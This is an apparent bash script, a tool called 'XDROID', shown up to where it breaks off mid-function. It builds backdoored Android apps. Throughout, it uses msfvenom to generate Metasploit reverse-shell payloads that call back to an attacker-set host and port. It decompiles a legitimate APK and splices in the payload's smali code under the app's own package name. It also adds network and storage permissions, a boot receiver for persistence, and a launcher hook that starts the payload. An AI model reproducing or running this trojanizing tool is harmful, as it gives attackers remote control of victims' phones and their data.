#!/usr/bin/env bash

# XDROID Framework . version 1.1
# XDROID is a framework that creates & generates & embeds apk payloads to penetrate android platform

#                     Developed By BabyPunk .
#                         Website: XXXXX
# Special thanks to : MrPedroubuntu, Kader Achraf, Youcef Yahia, and Mohammed Yacine

# Resize terminal window
resize -s 40 70 > /dev/null

# Colors
cyan='\e[0;36m'
lightcyan='\e[96m'
green='\e[0;32m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[1;33m'
blue='\e[1;34m'
Escape="\033"
white="${Escape}[0m"
RedF="${Escape}[31m"
GreenF="${Escape}[32m"
LighGreenF="${Escape}[92m"
YellowF="${Escape}[33m"
BlueF="${Escape}[34m"
CyanF="${Escape}[36m"
Reset="${Escape}[0m"

# Check root
if [[ $(id -u) -ne 0 ]]; then
  echo -e "$red You must be root to run the script"
  exit 1
fi

clear

# Check internet connection
function check_internet() {
  if ! ping -c 1 google.com &>/dev/null; then
    echo -e "${yellow} Checking For Internet: ${RedF}FAILED"
    echo -e "${red} This Script Needs An Active Internet Connection"
    echo -e "${yellow} XDROID Exit"
    sleep 2
    exit 1
  else
    echo -e "${yellow} Checking For Internet: ${LighGreenF}CONNECTED"
  fi
}

check_internet
sleep 2

# Define options
path=$(pwd)
lanip=$(hostname -I | awk '{print $1}')
publicip=$(curl -s http://ipinfo.io/ip)
ver="v1.1"
APKTOOL="$path/tools/apktool.jar"
VAR1=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10)
VAR2=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10)
VAR3=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10)
VAR4=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10)
VAR5=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10)
VAR6=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10)
VAR7=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10)
VAR8=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10)
perms='   <uses-permission android:name="android.permission.INTERNET"/>\n    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>\n    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>'

echo ""
sleep 1

# Spinner for Metasploit Generator
function spinlong() {
  bar=" +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
  barlength=${#bar}
  i=0
  while ((i < 100)); do
    n=$((i * barlength / 100))
    printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
    ((i += RANDOM % 5 + 2))
    sleep 0.02
  done
}

# Detect ctrl+c exiting
trap ctrl_c INT
function ctrl_c() {
  clear
  echo -e "${red}[*] (Ctrl + C) Detected, Trying To Exit..."
  echo -e "${red}[*] Stopping Services..."
  apache_svc_stop
  postgresql_stop
  sleep 1
  echo -e "${yellow}[*] Thanks For Using XDROID :)"
  exit
}

# Check dependencies existence
function check_dependency() {
  local dep=$1
  local install_cmd=$2

  which "$dep" &>/dev/null
  if [[ $? -eq 0 ]]; then
    echo -e "${green}[ ✔ ] ${dep}.............................${LighGreenF}[ found ]"
  else
    echo -e "${red}[ X ] ${dep} -> ${RedF}not found!"
    echo -e "${yellow}[ ! ] Installing ${dep}"
    eval "$install_cmd"
    echo -e "${blue}[ ✔ ] Done installing ${dep}...."
  fi
  sleep 2
}

echo -e "${blue}\n® Checking dependencies configuration ®\n"
check_dependency "msfconsole" "apt-get install metasploit-framework -y -qq"
check_dependency "xterm" "apt-get install xterm -y -qq"
check_dependency "zenity" "apt-get install zenity -y -qq"
check_dependency "aapt" "apt-get install aapt android-framework-res -y -qq"
check_dependency "apktool" "apt-get install apktool -y -qq"
check_dependency "zipalign" "apt-get install zipalign -y -qq"

# Directory setup
directory="$path/evilapk"
if [[ ! -d "$directory" ]]; then
  echo "Creating the output directory..."
  mkdir -p "$directory"
  sleep 3
fi

# ASCII banner
function print_ascii_art() {
  echo -e "${lightgreen}             .           .           "
  echo -e "${lightgreen}             M.          .M          "
  echo -e "${lightgreen}              MMMMMMMMMMM.           "
  echo -e "${lightgreen}           .MMM\\MMMMMMM/MMM.         "
  echo -e "${lightgreen}          .MMM.7MMMMMMM.7MMM.        "
  echo -e "${lightgreen}         .MMMMMMMMMMMMMMMMMMM        "
  echo -e "${lightgreen}         MMMMMMM.......MMMMMMM       "
  echo -e "${lightgreen}         MMMMMMMMMMMMMMMMMMMMM       "
  echo -e "${lightgreen}    MMMM MMMMMMMMMMMMMMMMMMMMM MMMM  "
  echo -e "${lightgreen}   dMMMM.MMMMMMMMMMMMMMMMMMMMM.MMMMD "
  echo -e "${lightgreen}   dMMMM.MMMMMMMMMMMMMMMMMMMMM.MMMMD "
  echo -e "${lightgreen}   dMMMM.MMMMMMMMMMMMMMMMMMMMM.MMMMD "
  echo -e "${lightgreen}   dMMMM.MMMMMMMMMMMMMMMMMMMMM.MMMMD "
  echo -e "${lightgreen}   dMMMM.MMMMMMMMMMMMMMMMMMMMM.MMMMD "
  echo -e "${lightgreen}   dMMMM.MMMMMMMMMMMMMMMMMMMMM.MMMMD "
  echo -e "${lightgreen}   dMMMM.MMMMMMMMMMMMMMMMMMMMM.MMMMD "
  echo -e "${lightgreen}    MMM8 MMMMMMMMMMMMMMMMMMMMM 8MMM  "
  echo -e "${lightgreen}         MMMMMMMMMMMMMMMMMMMMM       "
  echo -e "${lightgreen}         MMMMMMMMMMMMMMMMMMMMM       "
  echo -e "${lightgreen}             MMMMM   MMMMM  $ver     "
  echo -e "${lightgreen}             MMMMM   MMMMM           "
  echo -e "${lightgreen}             MMMMM   MMMMM           "
  echo -e "${lightgreen}             MMMMM   MMMMM           "
  echo -e "${lightgreen}             .MMM.   .MMM.           "
  echo -e "${lightgreen}                BabyGPunk            "
}

# Get local host IP
function get_lhost() {
  LHOST=$(zenity --title="☢ SET LHOST ☢" --text="Your-Local-ip: $lanip ; Your-Public-ip: $publicip" --entry-text="$lanip" --entry --width=300 2>/dev/null)
}

# Get local port
function get_lport() {
  LPORT=$(zenity --title="☢ SET LPORT ☢" --text="example: 4444" --entry-text="4444" --entry --width=300 2>/dev/null)
}

# Get payload type
function get_payload() {
  PAYLOAD=$(zenity --list --title="☢ XDROID ☢" --text="\nChoose payload option:" --radiolist --column="Choose" --column="Option" TRUE "android/shell/reverse_tcp" FALSE "android/shell/reverse_http" 2>/dev/null)
}

# Get payload name
function payload_name() {
  apk_name=$(zenity --title="☢ PAYLOAD NAME ☢" --text="example: evilapk" --entry --entry-text="evilapk" --width=300 2>/dev/null)
}

# Get original APK
function orig_apk() {
  orig=$(zenity --title="☢ ORIGINAL APK ☢" --filename="$path" --file-selection --file-filter="*.apk" --text="choose the original (apk)" 2>/dev/null)
}

# Change icon
function change_icon() {
  iconos=$(zenity --title="☢ CHOOSE ICON ☢" --filename="$path" --file-selection --file-filter="*.png" --text="choose your own icon." 2>/dev/null)
}

# Generate payload
function gen_payload() {
  echo -e "${yellow}\n[*] Generating apk payload"
  spinlong
  xterm -T "GENERATE APK PAYLOAD" -e msfvenom -p "$PAYLOAD" LHOST="$LHOST" LPORT="$LPORT" -a dalvik --platform android R -o "$apk_name.apk" &>/dev/null
}

# Embed payload
function embed_payload() {
  echo -e "${yellow}\n[*] Embedding apk payload in original apk"
  spinlong
  xterm -T "EMBED APK PAYLOAD" -e msfvenom -x "$orig" -p "$PAYLOAD" LHOST="$LHOST" LPORT="$LPORT" -a dalvik --platform android R -o "$apk_name.apk" &>/dev/null
}

# Update apktool
function up_apktool() {
  echo -e "${yellow}\n[*] Removing 1.apk framework file..."
  spinlong
  apktool empty-framework-dir --force &>/dev/null
}

# Decompile payload APK
function apk_decomp() {
  echo -e "${yellow}\n[*] Decompiling Payload APK..."
  spinlong
  xterm -T "Decompiling Payload" -e java -jar "$APKTOOL" d -f -o "$path/payload" "$path/$apk_name.apk" &>/dev/null
  rm "$apk_name.apk"
}

# Rebuild APK
function apk_comp() {
  echo -e "${yellow}\n[*] Rebuilding APK file..."
  spinlong
  xterm -T "Rebuilding Your APK" -e java -jar "$APKTOOL" b "$path/payload" -o evil.apk &>/dev/null
  rm -r payload &>/dev/null
}

# Decompile original APK
function apk_decomp1() {
  echo -e "${yellow}\n[*] Decompiling Original APK..."
  spinlong
  xterm -T "Decompiling Original" -e java -jar "$APKTOOL" d -f -o "$path/original" "$orig" &>/dev/null
}

# Rebuild backdoored APK
function apk_comp1() {
  echo -e "${yellow}\n[*] Rebuilding Backdoored APK..."
  spinlong
  xterm -T "Rebuilding APK" -e java -jar "$APKTOOL" b "$path/original" -o evil.apk &>/dev/null
  rm -r payload &>/dev/null
  rm -r original &>/dev/null
}

# Error handling
function error() {
  rc=$?
  if [[ $rc != 0 ]]; then
    echo -e "${red}\n【X】 Failed to rebuild backdoored apk. FUCK【X】"
    apache_svc_stop
    postgresql_stop
    exit $rc
  fi
}

function error0() {
  rc=$?
  if [[ $rc != 0 ]]; then
    echo -e "${red}\n【X】 An Error Occurred. Try Again【X】"
    apache_svc_stop
    postgresql_stop
    exit $rc
  fi
}

# Start apache2 service
function apache_svc_start() {
  systemctl start apache2 | zenity --progress --pulsate --title "PLEASE WAIT..." --text="Start apache2 service" --percentage=0 --auto-close --width=300 &>/dev/null
}

# Stop apache2 service
function apache_svc_stop() {
  systemctl stop apache2 | zenity --progress --pulsate --title "PLEASE WAIT..." --text="Stop apache2 service" --percentage=0 --auto-close --width=300 &>/dev/null
}

# Start postgresql service
function postgresql_start() {
  systemctl start postgresql | zenity --progress --pulsate --title "PLEASE WAIT..." --text="Start postgresql service" --percentage=0 --auto-close --width=300 &>/dev/null
}

# Stop postgresql service
function postgresql_stop() {
  systemctl stop postgresql | zenity --progress --pulsate --title "PLEASE WAIT..." --text="Stop postgresql service" --percentage=0 --auto-close --width=300 &>/dev/null
}

# Add permissions and hook smali
function perms() {
  echo -e "${yellow}\n[*] Adding permission and Hook Smali"
  spinlong
  package_name=$(grep -oP 'package="\K[^"]+' "$path/original/AndroidManifest.xml" | tr . /)
  package_dash=${package_name//\//.}
  tmp=$package_name
  sed -i "5i\ $perms" "$path/original/AndroidManifest.xml"
  rm "$path/payload/smali/com/metasploit/stage/MainActivity.smali"
  sed -i "s|Lcom/metasploit|L$package_name|g" "$path/payload/smali/com/metasploit/stage/"*
  cp -r "$path/payload/smali/com/metasploit/stage" "$path/original/smali/$package_name"
  rc=$?
  if [[ $rc != 0 ]]; then
    app_name=$(grep -oP 'android:name="\K[^"]+' "$path/original/AndroidManifest.xml" | tr . /)
    app_dash=${app_name//\//.}
    tmp=$app_name
    sed -i "s|L$package_name|L$app_name|g" "$path/payload/smali/com/metasploit/stage/"*
    cp -r "$path/payload/smali/com/metasploit/stage" "$path/original/smali/$app_name"
    amanifest="    </application>"
    boot_cmp="        <receiver android:label=\"MainBroadcastReceiver\" android:name=\"$app_dash.stage.MainBroadcastReceiver\">\n            <intent-filter>\n                <action android:name=\"android.intent.action.BOOT_COMPLETED\"/>\n            </intent-filter>\n        </receiver>"
    sed -i "s|$amanifest|$boot_cmp|g" "$path/original/AndroidManifest.xml"
  fi
  amanifest="    </application>"
  boot_cmp="        <receiver android:label=\"MainBroadcastReceiver\" android:name=\"$package_dash.stage.MainBroadcastReceiver\">\n            <intent-filter>\n                <action android:name=\"android.intent.action.BOOT_COMPLETED\"/>\n            </intent-filter>\n        </receiver>"
  sed -i "s|$amanifest|$boot_cmp|g" "$path/original/AndroidManifest.xml"
  android_nam=$tmp
}

# Hook smali files
function hook_smalies() {
  launcher_line_num=$(grep -n "android.intent.category.LAUNCHER" "$path/original/AndroidManifest.xml" | awk -F ":" 'NR==1{ print $1 }')
  android_name=$(grep -B "$launcher_line_num" "android.intent.category.LAUNCHER" "$path/original/AndroidManifest.xml" | grep -B "$launcher_line_num" "android.intent.action.MAIN" | grep "<application" | tail -1 | grep -oP 'android:name="\K[^"]+' | tr . /)
  android_activity=$(grep -B "$launcher_line_num" "android.intent.category.LAUNCHER" "$path/original/AndroidManifest.xml" | grep -B "$launcher_line_num" "android.intent.action.MAIN" | grep "<activity" | tail -1 | grep -oP 'android:name="\K[^"]+' | tr . /)
  android_targetActivity=$(grep -B "$launcher_line_num" "android.intent.category.LAUNCHER" "$path/original/AndroidManifest.xml" | grep -B "$launcher_line_num" "android.intent.action.MAIN" | grep "<activity" | grep -oP 'android:name="\K[^"]+' | tr . /)
  if [[ $android_name ]]; then
    echo "inject Smali: ${android_name##*/}.smali"
    hook_num=$(grep -n "    return-void" "$path/original/smali/$android_name.smali" | cut -d ";" -f 1 | awk -F ":" 'NR==1{ print $1 }')
    echo "In line:$hook_num"
    starter="   invoke-static {}, L$android_nam/stage/MainService;->start()V"
    sed -i "${hook_num}i\\ ${starter}" "$path/original/smali/$android_name.smali"
  elif [[ ! -e $android_activity ]]; then
    echo "inject Smali: ${android_activity##*/}.smali"
    hook_num=$(grep -n "    return-void" "$path/original/smali/$android_activity.smali" | cut -d ";" -f 1 | awk -F ":" 'NR==1{ print $1 }')
    echo "In line:$hook_num"
    starter="
